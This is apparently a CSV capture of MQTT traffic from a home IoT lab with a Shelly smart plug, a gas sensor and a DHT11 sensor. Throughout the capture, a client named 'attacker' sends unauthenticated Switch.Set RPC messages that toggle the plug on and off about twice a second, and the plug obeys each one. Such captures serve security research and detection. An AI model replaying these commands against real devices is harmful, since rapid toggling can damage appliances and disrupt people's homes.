2026-04-22T16:37:55,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5035 34407.979 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:55,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:37:55,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:37:55,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:55,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5036 34408.461 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:55,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:55,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34408.46,""swi"
2026-04-22T16:37:55,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5037 34408.477 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:56,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:56,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5038 34408.963 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:56,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:56,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34408.96,""swi"
2026-04-22T16:37:56,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5039 34408.981 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:56,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:56,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5040 34409.462 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:56,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:56,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34409.46,""swi"
2026-04-22T16:37:56,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5041 34409.478 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:37:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:37:56,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:37:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:37:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:37:57,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:57,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5042 34409.962 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:57,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:57,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34409.96,""swi"
2026-04-22T16:37:57,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5043 34409.981 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:57,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:57,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5044 34410.462 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:57,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:57,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34410.46,""swi"
2026-04-22T16:37:57,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5045 34410.479 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:58,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:58,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5046 34410.965 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:58,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:58,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34410.96,""swi"
2026-04-22T16:37:58,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5047 34410.984 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:58,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:58,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5048 34411.464 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:58,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:58,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34411.46,""swi"
2026-04-22T16:37:58,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5049 34411.480 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:37:59,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:37:59,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:37:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5050 34411.966 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:59,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:37:59,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34411.96,""swi"
2026-04-22T16:37:59,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5051 34411.984 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:37:59,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:37:59,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:37:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5052 34412.465 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:37:59,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:37:59,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34412.46,""swi"
2026-04-22T16:37:59,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5053 34412.481 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:00,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:00,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5054 34412.966 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:00,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:00,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34412.96,""swi"
2026-04-22T16:38:00,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5055 34412.986 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:00,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:00,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:00,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:00,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5056 34413.469 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:00,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:00,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34413.47,""swi"
2026-04-22T16:38:00,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5057 34413.485 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5058 34413.967 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34413.96,""swi"
2026-04-22T16:38:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5059 34413.986 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5060 34414.467 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34414.46,""swi"
2026-04-22T16:38:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5061 34414.484 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5062 34414.972 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34414.97,""swi"
2026-04-22T16:38:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5063 34414.990 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5064 34415.472 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34415.47,""swi"
2026-04-22T16:38:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5065 34415.488 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5066 34415.973 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:03,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:03,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34415.97,""swi"
2026-04-22T16:38:03,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5067 34415.992 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5068 34416.474 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34416.47,""swi"
2026-04-22T16:38:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5069 34416.490 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:04,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:04,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5070 34416.974 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:04,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:04,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34416.97,""swi"
2026-04-22T16:38:04,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5071 34416.993 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:04,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:04,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5072 34417.474 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:04,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:04,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34417.47,""swi"
2026-04-22T16:38:04,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5073 34417.491 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:05,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:05,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5074 34417.977 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:05,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:05,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34417.97,""swi"
2026-04-22T16:38:05,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5075 34417.995 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:05,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:05,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5076 34418.479 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:05,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:05,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34418.48,""swi"
2026-04-22T16:38:05,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5077 34418.496 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:06,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:06,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5078 34418.976 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:06,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:06,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34418.97,""swi"
2026-04-22T16:38:06,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5079 34418.995 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:06,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:06,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5080 34419.482 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:06,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:06,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34419.48,""swi"
2026-04-22T16:38:06,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5081 34419.499 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:38:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:38:06,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:38:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:38:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:38:07,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:07,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5082 34419.977 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:07,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:07,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34419.97,""swi"
2026-04-22T16:38:07,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5083 34419.995 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:07,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:07,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5084 34420.478 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:07,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:07,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34420.48,""swi"
2026-04-22T16:38:07,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5085 34420.494 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:08,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:08,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5086 34420.978 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
